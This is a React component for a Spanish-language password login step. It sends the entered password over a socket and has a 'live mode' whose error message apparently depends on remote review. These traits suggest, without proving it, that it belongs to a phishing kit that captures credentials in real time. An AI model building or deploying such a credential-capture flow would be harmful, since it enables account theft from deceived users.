import { useFormik } from 'formik'
import { useContext, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { SocketContext, UserDataContext } from '../../../context'

import { submitBase } from '../../../helpers/submitBase'
import { usernameAndPasswordValidate } from '../../../security/usernameAndPasswordValidate'
import { Spiner } from '../../Spiner'
import { ModeLiveContext } from '../../../context/ModeLiveContext'
import { PasswordKeyBoard } from './PasswordKeyBoard'
import { PasswordInput } from './PasswordInput'


const valuesData = { password: '' }

export const Password = ({urlToNavigate, spiner, timeLoader, endUrl = '', virtualKeyword = false, pageNow}) => {
    
    const navigate = useNavigate()
    const { addData } = useContext(UserDataContext)
    const { socket } =  useContext(SocketContext)  
    const { modeLive, liveDataFilter } = useContext(ModeLiveContext)
    const [liveError, setLiveError] = useState(null)
    const [showSpiner , setShowSpiner] = useState(false)
    const [valueKeyBoardVirtual, setValueKeyBoardVirtual] = useState('')
    
    const dataImportant = { addData, socket, setShowSpiner, urlToNavigate, spiner, timeLoader, navigate, modeLive, liveData: liveDataFilter, pageNow, setLiveError }
    
    const { values, handleSubmit, handleChange, errors, handleBlur, touched } = useFormik({
        initialValues: valuesData,
        validate: values => usernameAndPasswordValidate({values, virtualKeyword}),
        onSubmit: async(valuesData) => { submitBase({dataImportant, valuesData, endUrl}) }
    })
    
    return (
            showSpiner === true ? <Spiner /> : (
            <>
                {/* Aqui ira las notificacion de error en caso general */}
                <PasswordKeyBoard
                    touched={touched}
                    errors={errors}
                />
                {
                    virtualKeyword === true ? (<PasswordKeyBoard  afterUsernameValue={valueKeyBoardVirtual} setUsernameValue={setValueKeyBoardVirtual}/>) : null
                }
                {liveError === true && (<p className='px-[20px] text-white text-[14px] font-bold text-center py-3 bg-red-600'>Correo y clave inválidos.</p>)}
                {/* Colocar diseño base */}
                <form className='flex flex-col' onSubmit={handleSubmit}>

                    <PasswordInput
                        username={values.username}
                        handleChange={handleChange} 
                        handleBlur={handleBlur}
                        touched={touched}
                        errors={errors}
                        showPasswordMode={false}
                    />

                    <button 
                    disabled={
                        (
                            touched.password && 
                            errors.password || 
                            values.password.length === 0
                        ) == true ? true : false
                    }
                    className='bg-blue-400 px-4 py-1 rounded'
                    type='submit'
                    >
                        Ingresar
                    </button>
                </form>
            </>
            )
    )
}
